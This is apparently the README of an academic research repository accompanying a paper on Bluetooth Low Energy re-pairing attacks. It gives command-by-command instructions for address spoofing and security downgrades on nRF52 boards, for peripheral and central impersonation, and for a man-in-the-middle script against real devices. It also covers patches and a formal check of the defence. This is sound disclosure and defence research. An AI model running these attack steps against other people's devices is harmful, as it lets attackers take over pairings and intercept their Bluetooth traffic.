# BLE Re-Pairing Attacks PoC

This repository contains the attacks PoCs as described in the paper [BLERP: BLE Re-Pairing Attacks and Defenses](https://github.com/sacca97/blerp/blob/main/blerp-paper.pdf) accepted at NDSS 26'. A snapshot of this repository is also available at [doi.org/10.5281/zenodo.17671927](https://doi.org/10.5281/zenodo.17671927).

## Requirements

**Hardware:**
  * 2 Nordic nRF52840-DK (PCA10056)
  * Additional BLE devices to test (no BLE Audio)
  
> Note: two nRF52s are enough to test the attacks in a "controlled scenario" where one board acts first as a legitimate device and then as the attacker.

**Software:**

  * Ubuntu 22.04+ or Fedora 40+
  * [Arm GNU Toolchain 14.3.Rel1](https://developer.arm.com/downloads/-/arm-gnu-toolchain-downloads) (arm-none-eabi)
  * [Segger JLink V7.98h+](https://www.segger.com/downloads/jlink/)
  * [Apache newt v1.13.0](https://mynewt.apache.org)
  * Python 3.12+ (MitM attack only)
  * A serial device tool (e.g., [tio](https://github.com/tio/tio))


A pre-configured Docker Image is available on Zenodo. To use it run:

```bash
docker import blerp.tar.gz -c "CMD [\"/bin/bash\"]" blerp:1.1

docker run -it --user blerp -w /home/blerp/blerp --privileged --name blerp-test --net host -v /dev:/dev -v /var/run/dbus:/var/run/dbus blerp:1.1 bash
```


## Toolkit Setup

> Expected Time: 5-10 minutes

1. Setup the workspace and patch the NimBLE stack

```bash
git clone https://github.com/sacca97/blerp
cd blerp
./setup.sh
./apply_attacks_patch.sh
```

2. Run the following commands once per board to install the OS and bleshell app. The `id` parameter is the board's serial number (usually 9 or 10 digits prefixed with two zeroes). Use `tio -l | grep SEGGER` to check it from the command line.

```bash
make boot-10056 id=XXXXXXXXXX && make bleshell id=XXXXXXXXXX
```

3. Connect via serial and press _Tab_ to show the available commands and verify the installation was succesfull.

```bash
tio /dev/serial/by-id/usb-SEGGER_J-Link_00XXXXXXXXXX-if00
```

Once connected, pressing Tab will show the list of available commands.


## Testing In a Controlled Environment

> Expected Time: 3 minutes

Test the impersonation attacks on the NimBLE stack using only two nRF52 boards. The firmware resets on power loss (erasing the keys), enabling one board to act first as a legitimate device and then as the attacker.

### Initial Setup

> Expected Time: 1 minute

Pair the two boards. On the Peripheral run :
```sh
spoof-address addr=F8:4C:6D:E9:7A:B1 addr_type=random
spoof-adv-data name="MyMouse" appearance=962
advertise own_addr_type=random
```
On the Central run:
```sh
spoof-address addr=00:1A:79:FF:EE:DD addr_type=public
connect peer_addr=F8:4C:6D:E9:7A:B1 peer_addr_type=random own_addr_type=public
```

Ensure the log shows:
```sh
encryption change event; status=0
encrypted=1, authenticated=0, bonded=1
```

### Peripheral Impersonation

> Expected Time: 1 minute

1. Power cycle the Peripheral board to clear its keys. Then configure it to be the attacker:

    ```bash
    # Set again the victim's address
    spoof-address addr=F8:4C:6D:E9:7A:B1 addr_type=random

    # Downgrade security parameters
    spoof-authreq mitm=1 bond=1 sc=1
    security-set-data mitm=0 sc=0 keysize=7
    blerp-reject-enc val=1

    # Begin malicious advertising
    advertise own_addr_type=random
    ```
2. On the Central device, run the `connect` command again. 
    ```bash
    connect peer_addr=F8:4C:6D:E9:7A:B1 peer_addr_type=random own_addr_type=public
    ```
The log should show a connection with a partially zeroed-out Long Term Key (LTK) and status=0, indicating successful re-pairing :
```sh
LTK: 00000000000000000094439485d06811
encryption change event; status=0
encrypted=1, authenticated=0, bonded=1
```

### Central Impersonation

> Expected Time: 1 minute

The board that was previously the Central will now act as the attacker. If proceeding immediately after the previous attack, reset both boards and repeat the initial setup phase.

1. Power cycle the Central to clear keys. Then enter the following commands to spoof the legitimate central and downgrade security parameters :
    ```sh
    # Spoof the Legitimate Central's Address
    spoof-address addr=00:1A:79:FF:EE:DD addr_type=public

    # Downgrade Security Parameters
    security-set-data mitm=0 sc=0 keysize=7
    ```
2. Connect the attacker board to the victim Peripheral. On the Peripheral run:

    ```sh
    advertise own_addr_type=random
    ```
    While on the Central run:
    ```sh
    connect peer_addr=F8:4C:6D:E9:7A:B1 peer_addr_type=random own_addr_type=public
    ```
If successful, the expected log is similar to the previous one, with a partially zeroed-out LTK and no errors (status=0).

## Real-World Device Testing

> Expected Time: 10 minutes (highly affected by the time needed to find the parameters for spoofing)

Follows the logic and flow of the controlled environment testing section but using device-specific parameters. You need actual BLE devices (a Central and a Peripheral) in addition to the nRF52 boards .

### Peripheral Impersonation

1. Pair the Peripheral with the victim Central, then turn off the Peripheral.
2. Configure the board with the victim's address and appearance (e.g., 962 for mice, or [others](https://www.bluetooth.com/specifications/assigned-numbers/)).
3. Issue the _advertise_ command to start the attack. The victim Central will try to automatically reconnect.

If the Peripheral log resembles the following, the attack was successful:
```bash
pairing complete; status=0
encryption change event; status=0
encrypted=1, authenticated=0, bonded=1
```
When turned back on, the legitimate Peripheral should no longer connect.

### Central Impersonation

1. Pair the devices, then turn off the legitimate Central.
2. Configure the board with the Central's address (typically public).
3. Issue _connect_ command from the Central to start the attack.

If successful, the log is identical to the Peripheral Impersonation attack. The legitimate Central should no longer be able to connect to the legitimate Peripheral.

## Double-Channel MitM

> Expected Time: 2 minutes

This attack requires two nRF52 boards connected to a host laptop (attacker) to intercept traffic between the two victim devices.

1. Flash MitM firmware to both boards (clean install) using the USB port on the short edge.
```sh
make erase id=XXXXXXXXXX
make boot-10056 id=XXXXXXXXXX
make hci-dev id=XXXXXXXXXX
```
2. Connect the boards using the USB port on their long edge and see if they are detected using `sudo btmgmt info` or `hcitool dev` and looking for addresses `00:00:00:00:00:00`. Remember the devices' IDs for the next command.
3. Disconnect the legitimate devices by turning off Bluetooth on the Central.
4. Run the Python script with root. Use the HCI IDs from step 2.
```sh
sudo .venv/bin/python python-host/mitm.py --central-addr XX:XX:XX:XX:XX:XX --central-addr-type public --peripheral-name "Peripheral Name" --dev--ids X,Y
```
5. The malicious Central will connect to the legitimate Peripheral, clone its advertisement data, and the malicious Peripheral will start advertising.
6. Once advertising begins, manually turn the legitimate Central's Bluetooth back on. It will try to reconnect to the malicious Peripheral and the attack will start.


If the attack is successful, encryption should be enabled. Additionally, the two devices should work but exhibit visible lag, and the Peripheral's battery percentage should be 69%.

## Testing Hardened Re-pairing

Apply the patch, re-flash one nRF52, and repeat attacks from the controlled environment testing.
```bash
./apply_fixes_patch.sh
make erase id=XXXXXXXXXX
make boot-10056 id=XXXXXXXXXX
make legitimate id=XXXXXXXXXX
``` 

For both attacks, the logs on at least one device should report an encryption error similar to the following:

```sh
encryption change event; status=1283
encrypted=0, authenticated=0, bonded=0
```

## Verifying Authenticated Re-pairing {fix-2}

Use ProVerif to verify the protocol. For download and installation please refer to the [official website](https://proverif.inria.fr). Once installed, run:

```sh
proverif formal/blerp_fix.pv
```

The model verifies that an adversary cannot re-pair without knowing the original pairing key (authentication) and cannot tamper with the pairing messages (integrity). The expected ProVerif output is:

```c
// Integrity and Authentication (should be TRUE)
Query inj-event(end_B(k)) ==> inj-event(end_A(k)) is true.

// Sanity check (should be FALSE)
Query not (event(end_A(k)) && event(end_B(k))) is false.
```

The second query is a sanity check to confirm that the model is correct and the protocol terminates.